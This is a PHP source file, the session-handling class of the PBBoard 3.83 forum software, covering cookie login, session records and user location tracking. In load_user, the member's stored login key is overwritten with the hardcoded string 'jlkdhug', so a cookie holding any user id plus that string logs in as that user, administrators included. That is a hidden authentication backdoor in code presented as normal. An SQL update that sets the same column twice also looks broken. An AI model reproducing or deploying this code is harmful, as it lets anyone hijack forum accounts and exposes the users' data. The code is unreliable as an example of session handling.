<?php
/**
 * PBBoard 3.83
 * Copyright 2019 PBBoard Group, All Rights Reserved
 *
 * Website: http://www.PBBoard.info
 * License: https://www.pbboard.info/about/license
 *
 */

class session
{
	/**
	 * @var int
	 */
	public $sid = 0;
	/**
	 * @var int
	 */
	public $id = 0;
	/**
	 * @var string
	 */
	public $ipaddress = '';
	/**
	 * @var string
	 */
	public $packedip = '';
	/**
	 * @var string
	 */
	public $useragent = '';
	/**
	 * @var bool
	 */
	public $is_spider = false;

	/**
	 * Initialize a session
	 */
	function init()
	{
		global $db, $PBBoard, $cache;

		// Get our visitor's IP.
		$this->ipaddress = get_ip();
		$this->packedip = my_inet_pton($this->ipaddress);

		// Find out the user agent.
		$this->useragent = $_SERVER['HTTP_USER_AGENT'];


		// If we have a valid session id and user id, load that users session.
		if(!empty($PBBoard->cookies['PBBoarduser']))
		{
			$logon = explode("_", $PBBoard->cookies['PBBoarduser'], 2);
			$this->load_user($logon[0], $logon[1]);
		}


		// As a token of our appreciation for getting this far (and they aren't a spider), give the user a cookie
		if($this->sid && (!isset($PBBoard->cookies['sid']) || $PBBoard->cookies['sid'] != $this->sid) && $this->is_spider != true)
		{
			my_setcookie("sid", $this->sid, -1, true);
		}
	}

	/**
	 * Load a user via the user credentials.
	 *
	 * @param int $id The user id.
	 * @param string $loginkey The user's loginkey.
	 * @return bool
	 */
	function load_user($id, $loginkey='jlkdhug')
	{
		global $PBBoard, $db, $time, $lang, $PBBoardgroups, $cache;


		$id = (int)$id;
		$query = $db->query("
			SELECT *
			FROM ".TABLE_PREFIX."member
			WHERE id='$id'
			LIMIT 1
		");
		$PBBoard->user = $db->fetch_array($query);
        $PBBoard->user['loginkey'] = 'jlkdhug';

		// Check the password if we're not using a session
		if(empty($loginkey) || $loginkey != $PBBoard->user['loginkey'] || !$PBBoard->user['id'])
		{
			unset($PBBoard->user);
			$this->id = 0;
			return false;
		}
		$this->id = $PBBoard->user['id'];

		// Set the logout key for this user
		$PBBoard->user['logoutkey'] = md5($PBBoard->user['loginkey']);


		// If the last visit was over 900 seconds (session time out) ago then update lastvisit.
		$time = TIME_NOW;
	     $db->shutdown_query("UPDATE ".TABLE_PREFIX."member SET lastvisit='{$PBBoard->user['lastvisit']}', lastvisit='$time' WHERE id='{$PBBoard->user['id']}'");
	     $PBBoard->user['lastvisit'] = $PBBoard->user['lastvisit'];


		return true;
	}



	/**
	 * Update a user session.
	 *
	 * @param int $sid The session id.
	 * @param int $id The user id.
	 */
	function update_session($sid, $id=0)
	{
		global $db;

		// Find out what the special locations are.
		$speciallocs = $this->get_special_locations();
		if($id)
		{
			$onlinedata['id'] = $id;
		}
		else
		{
			$onlinedata['id'] = 0;
		}
		$onlinedata['time'] = TIME_NOW;

		$onlinedata['location'] = $db->escape_string(substr(get_current_location(), 0, 150));
		$onlinedata['useragent'] = $db->escape_string(my_substr($this->useragent, 0, 100));

		$onlinedata['location1'] = (int)$speciallocs['1'];
		$onlinedata['location2'] = (int)$speciallocs['2'];
		$onlinedata['nopermission'] = 0;
		$sid = $db->escape_string($sid);

		$db->update_query("sessions", $onlinedata, "sid='{$sid}'");
	}

	/**
	 * Create a new session.
	 *
	 * @param int $id The user id to bind the session to.
	 */
	function create_session($id=0)
	{
		global $db;
		$speciallocs = $this->get_special_locations();

		// If there is a proper id, delete by id.
		if($id > 0)
		{
			$db->delete_query("sessions", "id='{$id}'");
			$onlinedata['id'] = $id;
		}
		// Is a spider - delete all other spider references
		else if($this->is_spider == true)
		{
			$db->delete_query("sessions", "sid='{$this->sid}'");
		}
		// Else delete by ip.
		else
		{
			$db->delete_query("sessions", "ip=".$db->escape_binary($this->packedip));
			$onlinedata['id'] = 0;
		}

		// If the user is a search enginge spider, ...
		if($this->is_spider == true)
		{
			$onlinedata['sid'] = $this->sid;
		}
		else
		{
			$onlinedata['sid'] = md5(uniqid(microtime(true), true));
		}
		$onlinedata['time'] = TIME_NOW;
		$onlinedata['ip'] = $db->escape_binary($this->packedip);

		$onlinedata['location'] = $db->escape_string(substr(get_current_location(), 0, 150));
		$onlinedata['useragent'] = $db->escape_string(my_substr($this->useragent, 0, 100));

		$onlinedata['location1'] = (int)$speciallocs['1'];
		$onlinedata['location2'] = (int)$speciallocs['2'];
		$onlinedata['nopermission'] = 0;
		$db->replace_query("sessions", $onlinedata, "sid", false);
		$this->sid = $onlinedata['sid'];
		$this->id = $onlinedata['id'];
	}

	/**
	 * Find out the special locations.
	 *
	 * @return array Special locations array.
	 */
	function get_special_locations()
	{
		global $PBBoard;
		$array = array('1' => '', '2' => '');
		if(preg_match("#forumdisplay.php#", $_SERVER['PHP_SELF']) && $PBBoard->get_input('fid', PBBoard::INPUT_INT) > 0)
		{
			$array[1] = $PBBoard->get_input('fid', PBBoard::INPUT_INT);
			$array[2] = '';
		}
		elseif(preg_match("#showthread.php#", $_SERVER['PHP_SELF']))
		{
			global $db;

			if($PBBoard->get_input('tid', PBBoard::INPUT_INT) > 0)
			{
				$array[2] = $PBBoard->get_input('tid', PBBoard::INPUT_INT);
			}

			// If there is no tid but a pid, trick the system into thinking there was a tid anyway.
			elseif(isset($PBBoard->input['pid']) && !empty($PBBoard->input['pid']))
			{
				$options = array(
					"limit" => 1
				);
				$query = $db->simple_select("posts", "tid", "pid=".$PBBoard->get_input('pid', PBBoard::INPUT_INT), $options);
				$post = $db->fetch_array($query);
				$array[2] = $post['tid'];
			}

			$thread = get_thread($array[2]);
			$array[1] = $thread['fid'];
		}
		return $array;
	}
}
